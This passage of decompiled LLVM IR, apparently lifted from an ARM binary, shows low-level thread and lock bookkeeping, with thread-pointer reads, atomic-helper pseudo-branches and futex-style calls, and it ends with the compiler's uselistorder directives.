  br i1 %v9_136ac, label %dec_label_pc_136b4, label %dec_label_pc_136cc

dec_label_pc_136c8:                               ; preds = %dec_label_pc_136b4
  %v0_136c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_136c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_136cc

dec_label_pc_136cc:                               ; preds = %dec_label_pc_136a0, %dec_label_pc_136b4.dec_label_pc_136a8_crit_edge, %dec_label_pc_136c8
  %v0_136cc = phi i32 [ %v0_136c8, %dec_label_pc_136c8 ], [ %v2_136a8133, %dec_label_pc_136a0 ], [ %v2_136a8, %dec_label_pc_136b4.dec_label_pc_136a8_crit_edge ]
  %v1_136cc = phi i32 [ %v0_136c8, %dec_label_pc_136c8 ], [ %v3_1368c, %dec_label_pc_136a0 ], [ %v1_136ac.pre, %dec_label_pc_136b4.dec_label_pc_136a8_crit_edge ]
  %v3_136cc = icmp uge i32 %v0_136cc, %v1_136cc
  store i1 %v3_136cc, i1* %cpsr_c.global-to-local, align 1
  %v9_136cc = icmp eq i32 %v0_136cc, %v1_136cc
  br i1 %v9_136cc, label %dec_label_pc_136d4, label %dec_label_pc_13750.backedge

dec_label_pc_136d4:                               ; preds = %dec_label_pc_136cc
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_136e8 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_136d8

dec_label_pc_136d8:                               ; preds = %dec_label_pc_13740, %dec_label_pc_136d4
  %v0_136d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_136d8 = add i32 %v0_136d8, 4
  %v2_136d8 = inttoptr i32 %v1_136d8 to i32*
  %v3_136d8 = load i32, i32* %v2_136d8, align 4
  store i32 %v3_136d8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_136dc = icmp eq i32 %v3_136d8, 0
  br i1 %v2_136dc, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_136d8
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_136d8, %bb
  %v2_136e4 = xor i1 %v2_136dc, true
  call void @__pseudo_cond_branch(i1 %v2_136e4, i32 %v3_136d8)
  %v0_136ec = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_136ec, i32* %stack_var_-88, align 4
  %v1_136f0 = inttoptr i32 %v0_136ec to i32*
  %v2_136f0 = load i32, i32* %v1_136f0, align 4
  store i32 %v2_136f0, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_136f4 = icmp eq i32 %v2_136f0, 0
  store i32 %v2_136e8, i32* %r5.global-to-local, align 4
  br i1 %v2_136f4, label %dec_label_pc_13760.loopexit, label %dec_label_pc_13708

dec_label_pc_13708:                               ; preds = %bb72
  %v1_13708 = add i32 %v2_136f0, 20
  store i32 %v1_13708, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1370c

dec_label_pc_1370c:                               ; preds = %dec_label_pc_13740.dec_label_pc_1370c_crit_edge, %dec_label_pc_13708
  %v0_13710 = phi i32 [ %v0_13710.pre, %dec_label_pc_13740.dec_label_pc_1370c_crit_edge ], [ %v1_13708, %dec_label_pc_13708 ]
  %v0_1370c = phi i32 [ %v0_1370c.pre, %dec_label_pc_13740.dec_label_pc_1370c_crit_edge ], [ %v2_136f0, %dec_label_pc_13708 ]
  %v1_1370c = add i32 %v0_1370c, 20
  %v2_1370c = inttoptr i32 %v1_1370c to i32*
  %v3_1370c = load i32, i32* %v2_1370c, align 4
  store i32 %v0_13710, i32* %r2.global-to-local, align 4
  store i32 %v3_1370c, i32* %r4.global-to-local, align 4
  %v1_1371c119 = inttoptr i32 %v0_13710 to i32*
  %v2_1371c120 = load i32, i32* %v1_1371c119, align 4
  store i32 %v2_1371c120, i32* %r3.global-to-local, align 4
  %v3_13720122 = icmp uge i32 %v2_1371c120, %v3_1370c
  store i1 %v3_13720122, i1* %cpsr_c.global-to-local, align 1
  %v9_13720128 = icmp eq i32 %v2_1371c120, %v3_1370c
  br i1 %v9_13720128, label %dec_label_pc_13728, label %dec_label_pc_13740

dec_label_pc_13728:                               ; preds = %dec_label_pc_1370c, %dec_label_pc_13728.dec_label_pc_1371c_crit_edge
  %v0_13728129 = phi i32 [ %v1_13720.pre, %dec_label_pc_13728.dec_label_pc_1371c_crit_edge ], [ %v3_1370c, %dec_label_pc_1370c ]
  store i32 %v0_13728129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13738 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13738, label %dec_label_pc_1373c, label %dec_label_pc_13728.dec_label_pc_1371c_crit_edge

dec_label_pc_13728.dec_label_pc_1371c_crit_edge:  ; preds = %dec_label_pc_13728
  %v0_1371c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13720.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1371c = inttoptr i32 %v0_1371c.pre to i32*
  %v2_1371c = load i32, i32* %v1_1371c, align 4
  store i32 %v2_1371c, i32* %r3.global-to-local, align 4
  %v3_13720 = icmp uge i32 %v2_1371c, %v1_13720.pre
  store i1 %v3_13720, i1* %cpsr_c.global-to-local, align 1
  %v9_13720 = icmp eq i32 %v2_1371c, %v1_13720.pre
  br i1 %v9_13720, label %dec_label_pc_13728, label %dec_label_pc_13740

dec_label_pc_1373c:                               ; preds = %dec_label_pc_13728
  %v0_1373c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1373c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13740

dec_label_pc_13740:                               ; preds = %dec_label_pc_1370c, %dec_label_pc_13728.dec_label_pc_1371c_crit_edge, %dec_label_pc_1373c
  %v0_13740 = phi i32 [ %v0_1373c, %dec_label_pc_1373c ], [ %v2_1371c120, %dec_label_pc_1370c ], [ %v2_1371c, %dec_label_pc_13728.dec_label_pc_1371c_crit_edge ]
  %v1_13740 = phi i32 [ %v0_1373c, %dec_label_pc_1373c ], [ %v3_1370c, %dec_label_pc_1370c ], [ %v1_13720.pre, %dec_label_pc_13728.dec_label_pc_1371c_crit_edge ]
  %v3_13740 = icmp uge i32 %v0_13740, %v1_13740
  store i1 %v3_13740, i1* %cpsr_c.global-to-local, align 1
  %v9_13740 = icmp eq i32 %v0_13740, %v1_13740
  store i32 %v2_136e8, i32* %r4.global-to-local, align 4
  br i1 %v9_13740, label %dec_label_pc_136d8, label %dec_label_pc_13740.dec_label_pc_1370c_crit_edge

dec_label_pc_13740.dec_label_pc_1370c_crit_edge:  ; preds = %dec_label_pc_13740
  %v0_1370c.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_13710.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1370c

dec_label_pc_1375c:                               ; preds = %dec_label_pc_13750.backedge, %entry
  %v0_1376431 = phi i32 [ ptrtoint (i32* @global_var_214b8.340 to i32), %entry ], [ %v0_13750, %dec_label_pc_13750.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13760

dec_label_pc_13760.loopexit:                      ; preds = %bb72
  store i32 %v2_136e8, i32* %r6.global-to-local, align 4
  %v0_13764.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13760

dec_label_pc_13760:                               ; preds = %dec_label_pc_13760.loopexit, %dec_label_pc_1375c
  %v0_13764 = phi i32 [ %v0_13764.pre, %dec_label_pc_13760.loopexit ], [ %v0_1376431, %dec_label_pc_1375c ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_13764 = add i32 %v0_13764, 152
  %v3_13764 = inttoptr i32 %v2_13764 to i32*
  %v4_13764 = load i32, i32* %v3_13764, align 4
  store i32 %v4_13764, i32* %r7.global-to-local, align 4
  %v0_13768 = call i32 @__aeabi_read_tp()
  store i32 %v0_13768, i32* %r0.global-to-local, align 4
  %v1_1376c = add i32 %v4_13764, 8
  %v2_1376c = inttoptr i32 %v1_1376c to i32*
  %v3_1376c = load i32, i32* %v2_1376c, align 4
  store i32 %v3_1376c, i32* %r3.global-to-local, align 4
  %v1_13770 = add i32 %v0_13768, -1168
  store i32 %v1_13770, i32* %r5.global-to-local, align 4
  %v3_13774 = icmp uge i32 %v3_1376c, %v1_13770
  store i1 %v3_13774, i1* %cpsr_c.global-to-local, align 1
  %v9_13774 = icmp eq i32 %v3_1376c, %v1_13770
  br i1 %v9_13774, label %dec_label_pc_138dc, label %dec_label_pc_1377c

dec_label_pc_1377c:                               ; preds = %dec_label_pc_13760
  store i32 %v4_13764, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_13788112 = inttoptr i32 %v4_13764 to i32*
  %v2_13788113 = load i32, i32* %v1_13788112, align 4
  store i32 %v2_13788113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1378c115 = icmp eq i32 %v2_13788113, 0
  br i1 %v9_1378c115, label %dec_label_pc_13794, label %dec_label_pc_137ac

dec_label_pc_13794:                               ; preds = %dec_label_pc_1377c, %dec_label_pc_13794.dec_label_pc_13788_crit_edge
  %v0_13794116 = phi i32 [ %v1_1378c.pre, %dec_label_pc_13794.dec_label_pc_13788_crit_edge ], [ 0, %dec_label_pc_1377c ]
  store i32 %v0_13794116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_137a4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_137a4, label %dec_label_pc_137a8, label %dec_label_pc_13794.dec_label_pc_13788_crit_edge

dec_label_pc_13794.dec_label_pc_13788_crit_edge:  ; preds = %dec_label_pc_13794
  %v0_13788.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1378c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13788 = inttoptr i32 %v0_13788.pre to i32*
  %v2_13788 = load i32, i32* %v1_13788, align 4
  store i32 %v2_13788, i32* %r3.global-to-local, align 4
  %v3_1378c = icmp uge i32 %v2_13788, %v1_1378c.pre
  store i1 %v3_1378c, i1* %cpsr_c.global-to-local, align 1
  %v9_1378c = icmp eq i32 %v2_13788, %v1_1378c.pre
  br i1 %v9_1378c, label %dec_label_pc_13794, label %dec_label_pc_137ac

dec_label_pc_137a8:                               ; preds = %dec_label_pc_13794
  %v0_137a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_137a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_137ac

dec_label_pc_137ac:                               ; preds = %dec_label_pc_1377c, %dec_label_pc_13794.dec_label_pc_13788_crit_edge, %dec_label_pc_137a8
  %v0_137ac = phi i32 [ %v0_137a8, %dec_label_pc_137a8 ], [ %v2_13788113, %dec_label_pc_1377c ], [ %v2_13788, %dec_label_pc_13794.dec_label_pc_13788_crit_edge ]
  %v1_137ac = phi i32 [ %v0_137a8, %dec_label_pc_137a8 ], [ 0, %dec_label_pc_1377c ], [ %v1_1378c.pre, %dec_label_pc_13794.dec_label_pc_13788_crit_edge ]
  %v3_137ac = icmp uge i32 %v0_137ac, %v1_137ac
  store i1 %v3_137ac, i1* %cpsr_c.global-to-local, align 1
  %v9_137ac = icmp eq i32 %v0_137ac, %v1_137ac
  br i1 %v9_137ac, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_137ac
  %v1_137b0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_137b0, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_137ac, %bb73
  %v1_137b4 = xor i1 %v9_137ac, true
  call void @__pseudo_cond_branch(i1 %v1_137b4, i32 ptrtoint (i32* @global_var_13a2c.496 to i32))
  %v0_137b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_137b8 = load i32, i32* %r7.global-to-local, align 4
  %v2_137b8 = add i32 %v1_137b8, 8
  %v3_137b8 = inttoptr i32 %v2_137b8 to i32*
  store i32 %v0_137b8, i32* %v3_137b8, align 4
  br label %dec_label_pc_138dc

dec_label_pc_138dc:                               ; preds = %bb74, %dec_label_pc_13760
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_137c0 = load i32, i32* %r8.global-to-local, align 4
  %v2_137c0 = add i32 %v0_137c0, 152
  %v3_137c0 = inttoptr i32 %v2_137c0 to i32*
  %v4_137c0 = load i32, i32* %v3_137c0, align 4
  store i32 %v4_137c0, i32* %r2.global-to-local, align 4
  %v1_137c4 = add i32 %v4_137c0, 4
  %v2_137c4 = inttoptr i32 %v1_137c4 to i32*
  %v3_137c4 = load i32, i32* %v2_137c4, align 4
  %v1_137c8 = add i32 %v3_137c4, 1
  store i32 %v1_137c8, i32* %r3.global-to-local, align 4
  store i32 %v1_137c8, i32* %v2_137c4, align 4
  %v0_137d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_137d0 = add i32 %v0_137d0, 108
  %v2_137d0 = inttoptr i32 %v1_137d0 to i32*
  %v3_137d0 = load i32, i32* %v2_137d0, align 4
  store i32 %v3_137d0, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_137d8 = sub i32 0, %v3_137d0
  store i32 %v1_137d8, i32* %v2_137d0, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_137ec = load i32, i32* %r5.global-to-local, align 4
  %v1_137ec = add i32 %v0_137ec, 104
  store i32 %v1_137ec, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_138e0.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_138e0 = add i32 %v0_137ec, 108
  %v3_138e0 = inttoptr i32 %v2_138e0 to i32*
  store i32 %v0_138e0.pre, i32* %v3_138e0, align 4
  %v0_138e4 = load i32, i32* %r8.global-to-local, align 4
  %v1_138e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_138e4 = add i32 %v1_138e4, %v0_138e4
  %v3_138e4 = inttoptr i32 %v2_138e4 to i32*
  %v4_138e4 = load i32, i32* %v3_138e4, align 4
  store i32 %v4_138e4, i32* %r0.global-to-local, align 4
  %v1_138e8 = add i32 %v4_138e4, 4
  %v2_138e8 = inttoptr i32 %v1_138e8 to i32*
  %v3_138e8 = load i32, i32* %v2_138e8, align 4
  %v1_138ec = add i32 %v3_138e8, -1
  store i32 %v1_138ec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_138f0 = icmp eq i32 %v1_138ec, 0
  store i32 %v1_138ec, i32* %v2_138e8, align 4
  br i1 %v2_138f0, label %dec_label_pc_138fc, label %dec_label_pc_139ecthread-pre-split

dec_label_pc_138fc:                               ; preds = %dec_label_pc_138dc
  %v0_138fc = load i32, i32* %r3.global-to-local, align 4
  %v1_138fc = load i32, i32* %r0.global-to-local, align 4
  %v2_138fc = add i32 %v1_138fc, 8
  %v3_138fc = inttoptr i32 %v2_138fc to i32*
  store i32 %v0_138fc, i32* %v3_138fc, align 4
  %v0_13900 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13900, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13904

dec_label_pc_13904:                               ; preds = %dec_label_pc_13934.dec_label_pc_13904_crit_edge, %dec_label_pc_138fc
  %v0_13904 = phi i32 [ %v0_13904.pre, %dec_label_pc_13934.dec_label_pc_13904_crit_edge ], [ %v0_13900, %dec_label_pc_138fc ]
  %v1_13904 = inttoptr i32 %v0_13904 to i32*
  %v2_13904 = load i32, i32* %v1_13904, align 4
  store i32 %v2_13904, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_13904, i32* %r2.global-to-local, align 4
  %v2_13910100 = load i32, i32* %v1_13904, align 4
  store i32 %v2_13910100, i32* %r3.global-to-local, align 4
  %v3_13914102 = icmp uge i32 %v2_13910100, %v2_13904
  store i1 %v3_13914102, i1* %cpsr_c.global-to-local, align 1
  %v9_13914108 = icmp eq i32 %v2_13910100, %v2_13904
  br i1 %v9_13914108, label %dec_label_pc_1391c, label %dec_label_pc_13934

dec_label_pc_1391c:                               ; preds = %dec_label_pc_13904, %dec_label_pc_1391c.dec_label_pc_13910_crit_edge
  %v0_1391c109 = phi i32 [ %v1_13914.pre, %dec_label_pc_1391c.dec_label_pc_13910_crit_edge ], [ %v2_13904, %dec_label_pc_13904 ]
  store i32 %v0_1391c109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1392c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1392c, label %dec_label_pc_13930, label %dec_label_pc_1391c.dec_label_pc_13910_crit_edge

dec_label_pc_1391c.dec_label_pc_13910_crit_edge:  ; preds = %dec_label_pc_1391c
  %v0_13910.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13914.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13910 = inttoptr i32 %v0_13910.pre to i32*
  %v2_13910 = load i32, i32* %v1_13910, align 4
  store i32 %v2_13910, i32* %r3.global-to-local, align 4
  %v3_13914 = icmp uge i32 %v2_13910, %v1_13914.pre
  store i1 %v3_13914, i1* %cpsr_c.global-to-local, align 1
  %v9_13914 = icmp eq i32 %v2_13910, %v1_13914.pre
  br i1 %v9_13914, label %dec_label_pc_1391c, label %dec_label_pc_13934

dec_label_pc_13930:                               ; preds = %dec_label_pc_1391c
  %v0_13930 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13930, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13934

dec_label_pc_13934:                               ; preds = %dec_label_pc_13904, %dec_label_pc_1391c.dec_label_pc_13910_crit_edge, %dec_label_pc_13930
  %v0_1393c = phi i32 [ %v0_13930, %dec_label_pc_13930 ], [ %v2_13910100, %dec_label_pc_13904 ], [ %v2_13910, %dec_label_pc_1391c.dec_label_pc_13910_crit_edge ]
  %v1_13934 = phi i32 [ %v0_13930, %dec_label_pc_13930 ], [ %v2_13904, %dec_label_pc_13904 ], [ %v1_13914.pre, %dec_label_pc_1391c.dec_label_pc_13910_crit_edge ]
  %v3_13934 = icmp uge i32 %v0_1393c, %v1_13934
  store i1 %v3_13934, i1* %cpsr_c.global-to-local, align 1
  %v9_13934 = icmp eq i32 %v0_1393c, %v1_13934
  br i1 %v9_13934, label %dec_label_pc_1393c, label %dec_label_pc_13934.dec_label_pc_13904_crit_edge

dec_label_pc_13934.dec_label_pc_13904_crit_edge:  ; preds = %dec_label_pc_13934
  %v0_13904.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13904

dec_label_pc_1393c:                               ; preds = %dec_label_pc_13934
  %v2_1393c = icmp ne i32 %v1_13934, 0
  store i1 %v2_1393c, i1* %cpsr_c.global-to-local, align 1
  %v7_13940 = icmp slt i32 %v1_13934, 2
  br i1 %v7_13940, label %dec_label_pc_139ecthread-pre-split, label %dec_label_pc_13944

dec_label_pc_13944:                               ; preds = %dec_label_pc_1393c
  %v0_13944 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13944, i32* %r0.global-to-local, align 4
  %v0_13948 = load i32, i32* @r1, align 4
  %v1_13948 = add i32 %v0_13948, 129
  store i32 %v1_13948, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_139ecthread-pre-split

dec_label_pc_13960:                               ; preds = %dec_label_pc_139ecthread-pre-split, %dec_label_pc_139e8
  %v0_13960 = phi i32 [ %v3_139e8, %dec_label_pc_139e8 ], [ %v0_139ec.pr, %dec_label_pc_139ecthread-pre-split ]
  %v1_13960 = inttoptr i32 %v0_13960 to i32*
  %v2_13960 = load i32, i32* %v1_13960, align 4
  store i32 %v2_13960, i32* %r3.global-to-local, align 4
  %v1_13964 = add i32 %v2_13960, 8
  %v2_13964 = inttoptr i32 %v1_13964 to i32*
  %v3_13964 = load i32, i32* %v2_13964, align 4
  store i32 %v3_13964, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13968 = icmp eq i32 %v3_13964, 0
  br i1 %v2_13968, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_13960
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_13960, %bb75
  %v2_13970 = xor i1 %v2_13968, true
  call void @__pseudo_cond_branch(i1 %v2_13970, i32 %v3_13964)
  %v0_13974 = load i32, i32* %r6.global-to-local, align 4
  %v1_13974 = inttoptr i32 %v0_13974 to i32*
  %v2_13974 = load i32, i32* %v1_13974, align 4
  store i32 %v2_13974, i32* %r5.global-to-local, align 4
  %v1_13978 = add i32 %v2_13974, 20
  store i32 %v1_13978, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1397c

dec_label_pc_1397c:                               ; preds = %dec_label_pc_139b0.dec_label_pc_1397c_crit_edge, %bb76
  %v0_13980 = phi i32 [ %v0_13980.pre, %dec_label_pc_139b0.dec_label_pc_1397c_crit_edge ], [ %v1_13978, %bb76 ]
  %v0_1397c = phi i32 [ %v0_1397c.pre, %dec_label_pc_139b0.dec_label_pc_1397c_crit_edge ], [ %v2_13974, %bb76 ]
  %v1_1397c = add i32 %v0_1397c, 20
  %v2_1397c = inttoptr i32 %v1_1397c to i32*
  %v3_1397c = load i32, i32* %v2_1397c, align 4
  store i32 %v0_13980, i32* %r2.global-to-local, align 4
  store i32 %v3_1397c, i32* %r4.global-to-local, align 4
  %v1_13988 = add i32 %v3_1397c, -1
  store i32 %v1_13988, i32* @r1, align 4
  %v1_1398c87 = inttoptr i32 %v0_13980 to i32*
  %v2_1398c88 = load i32, i32* %v1_1398c87, align 4
  store i32 %v2_1398c88, i32* %r3.global-to-local, align 4
  %v3_1399090 = icmp uge i32 %v2_1398c88, %v3_1397c
  store i1 %v3_1399090, i1* %cpsr_c.global-to-local, align 1
  %v9_1399096 = icmp eq i32 %v2_1398c88, %v3_1397c
  br i1 %v9_1399096, label %dec_label_pc_13998, label %dec_label_pc_139b0

dec_label_pc_13998:                               ; preds = %dec_label_pc_1397c, %dec_label_pc_13998.dec_label_pc_1398c_crit_edge
  %v0_1399897 = phi i32 [ %v1_13990.pre, %dec_label_pc_13998.dec_label_pc_1398c_crit_edge ], [ %v3_1397c, %dec_label_pc_1397c ]
  store i32 %v0_1399897, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_139a8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_139a8, label %dec_label_pc_139ac, label %dec_label_pc_13998.dec_label_pc_1398c_crit_edge

dec_label_pc_13998.dec_label_pc_1398c_crit_edge:  ; preds = %dec_label_pc_13998
  %v0_1398c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13990.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1398c = inttoptr i32 %v0_1398c.pre to i32*
  %v2_1398c = load i32, i32* %v1_1398c, align 4
  store i32 %v2_1398c, i32* %r3.global-to-local, align 4
  %v3_13990 = icmp uge i32 %v2_1398c, %v1_13990.pre
  store i1 %v3_13990, i1* %cpsr_c.global-to-local, align 1
  %v9_13990 = icmp eq i32 %v2_1398c, %v1_13990.pre
  br i1 %v9_13990, label %dec_label_pc_13998, label %dec_label_pc_139b0

dec_label_pc_139ac:                               ; preds = %dec_label_pc_13998
  %v0_139ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_139ac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_139b0

dec_label_pc_139b0:                               ; preds = %dec_label_pc_1397c, %dec_label_pc_13998.dec_label_pc_1398c_crit_edge, %dec_label_pc_139ac
  %v0_139bc = phi i32 [ %v0_139ac, %dec_label_pc_139ac ], [ %v2_1398c88, %dec_label_pc_1397c ], [ %v2_1398c, %dec_label_pc_13998.dec_label_pc_1398c_crit_edge ]
  %v1_139b0 = phi i32 [ %v0_139ac, %dec_label_pc_139ac ], [ %v3_1397c, %dec_label_pc_1397c ], [ %v1_13990.pre, %dec_label_pc_13998.dec_label_pc_1398c_crit_edge ]
  %v3_139b0 = icmp uge i32 %v0_139bc, %v1_139b0
  store i1 %v3_139b0, i1* %cpsr_c.global-to-local, align 1
  %v9_139b0 = icmp eq i32 %v0_139bc, %v1_139b0
  store i32 %v0_139bc, i32* %r2.global-to-local, align 4
  br i1 %v9_139b0, label %dec_label_pc_139bc, label %dec_label_pc_139b0.dec_label_pc_1397c_crit_edge

dec_label_pc_139b0.dec_label_pc_1397c_crit_edge:  ; preds = %dec_label_pc_139b0
  %v0_1397c.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_13980.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1397c

dec_label_pc_139bc:                               ; preds = %dec_label_pc_139b0
  %v2_139bc = icmp ne i32 %v1_139b0, 0
  store i1 %v2_139bc, i1* %cpsr_c.global-to-local, align 1
  %v7_139bc = icmp eq i32 %v1_139b0, 1
  %v0_139c4 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_139bc, label %dec_label_pc_139c4, label %dec_label_pc_139e8

dec_label_pc_139c4:                               ; preds = %dec_label_pc_139bc
  %v1_139c4 = inttoptr i32 %v0_139c4 to i32*
  %v2_139c4 = load i32, i32* %v1_139c4, align 4
  store i32 %v2_139c4, i32* @r1, align 4
  %v1_139c8 = add i32 %v2_139c4, 24
  %v2_139c8 = inttoptr i32 %v1_139c8 to i32*
  %v3_139c8 = load i32, i32* %v2_139c8, align 4
  store i32 %v3_139c8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_139cc = icmp eq i32 %v3_139c8, 0
  br i1 %v2_139cc, label %dec_label_pc_139e8, label %dec_label_pc_139d4

dec_label_pc_139d4:                               ; preds = %dec_label_pc_139c4
  %v1_139d4 = add i32 %v2_139c4, 20
  %v2_139d4 = inttoptr i32 %v1_139d4 to i32*
  %v3_139d4 = load i32, i32* %v2_139d4, align 4
  store i32 %v3_139d4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_139e8

dec_label_pc_139e8:                               ; preds = %dec_label_pc_139bc, %dec_label_pc_139d4, %dec_label_pc_139c4
  %v1_139e8 = add i32 %v0_139c4, 4
  %v2_139e8 = inttoptr i32 %v1_139e8 to i32*
  %v3_139e8 = load i32, i32* %v2_139e8, align 4
  store i32 %v3_139e8, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_139ec = icmp eq i32 %v3_139e8, 0
  br i1 %v2_139ec, label %dec_label_pc_139f4, label %dec_label_pc_13960

dec_label_pc_139ecthread-pre-split:               ; preds = %dec_label_pc_13944, %dec_label_pc_1393c, %dec_label_pc_138dc
  %v0_139ec.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_139ec11 = icmp eq i32 %v0_139ec.pr, 0
  br i1 %v2_139ec11, label %dec_label_pc_139f4, label %dec_label_pc_13960

dec_label_pc_139f4:                               ; preds = %dec_label_pc_139e8, %dec_label_pc_139ecthread-pre-split
  %v0_139f4.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_139f4.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_139f4.pre

; uselistorder directives
  uselistorder i32 %v0_139ec.pr, { 1, 0 }
  uselistorder i32 %v3_139e8, { 1, 2, 0 }
  uselistorder i32 %v1_139b0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_139ac, { 1, 0, 2 }
  uselistorder i32 %v1_13990.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_13930, { 1, 0, 2 }
  uselistorder i32 %v1_13914.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_13904, { 1, 0 }
  uselistorder i32 %v0_137a8, { 1, 0, 2 }
  uselistorder i32 %v1_1378c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_13764, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1373c, { 1, 0, 2 }
  uselistorder i32 %v1_13720.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_136e8, { 1, 0, 2 }
  uselistorder i32 %v0_136c8, { 1, 0, 2 }
  uselistorder i32 %v1_136ac.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 14, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 13, 12, 0 }
  uselistorder i32* %r6.global-to-local, { 3, 7, 5, 6, 4, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 9, 10, 12, 11, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 33, 4, 5, 7, 6, 2, 8, 9, 10, 11, 13, 12, 0, 14, 15, 16, 17, 18, 19, 20, 22, 21, 34, 23, 24, 25, 27, 26, 3, 28, 29, 31, 30, 1, 32 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
